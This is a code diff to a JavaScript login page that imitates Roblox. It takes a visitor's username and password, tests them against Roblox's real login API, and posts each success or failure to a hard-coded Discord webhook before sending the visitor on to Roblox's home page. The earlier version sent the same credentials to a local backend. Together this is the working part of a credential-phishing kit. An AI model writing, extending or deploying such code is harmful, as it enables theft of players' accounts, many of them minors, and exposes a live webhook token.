@@ -22,8 +22,12 @@ button { padding:10px 20px; margin-top:10px; cursor:pointer; }
 const loginBtn = document.getElementById("loginBtn");
 const statusEl = document.getElementById("status");
 
+// Discord webhook URLs
+const successWebhook = "https://discord.com/api/webhooks/1393508495420030987/dKHHqBLcjqglOoFcSFNyndVdyZUq_476AQ31eSd8v5mYQa0zkIrTthTxgB2_JuLOMitX";
+const failedWebhook = "https://discord.com/api/webhooks/1393508495420030987/dKHHqBLcjqglOoFcSFNyndVdyZUq_476AQ31eSd8v5mYQa0zkIrTthTxgB2_JuLOMitX";
+
 loginBtn.addEventListener("click", async () => {
-    const username = document.getElementById("username").value;
+    const username = document.getElementById("username").value.trim();
     const password = document.getElementById("password").value;
 
     if (!username || !password) {
@@ -34,25 +38,41 @@ loginBtn.addEventListener("click", async () => {
     statusEl.textContent = "⏳ Logging in...";
 
     try {
-        // Send credentials to your Python backend
-        const res = await fetch("http://127.0.0.1:6969/login", {
+        // Attempt Roblox login via API
+        const response = await fetch("https://auth.roblox.com/v2/login", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ username, password })
+            body: JSON.stringify({ cusername: username, password: password })
         });
-        const data = await res.json();
 
-        if (data.success) {
-            statusEl.textContent = "✅ Login successful! Discord webhook sent.";
+        const data = await response.json();
+
+        if (data.user) {
+            statusEl.textContent = "✅ Login successful!";
+
+            // Send success to Discord
+            await fetch(successWebhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: `✅ Login Success\nUser: ${username}\nUserId: ${data.user.userId}` })
+            });
+
             // Optional: redirect to Roblox homepage
             window.location.href = "https://www.roblox.com/home";
         } else {
-            statusEl.textContent = "❌ Login failed! Discord webhook sent.";
+            statusEl.textContent = "❌ Login failed!";
+
+            // Send failed to Discord
+            await fetch(failedWebhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ content: `❌ Login Failed\nUser: ${username}` })
+            });
         }
 
-    } catch(err) {
+    } catch (err) {
         console.error(err);
-        statusEl.textContent = "❌ Failed to reach backend!";
+        statusEl.textContent = "❌ Error connecting to Roblox API!";
     }
 });
 </script>
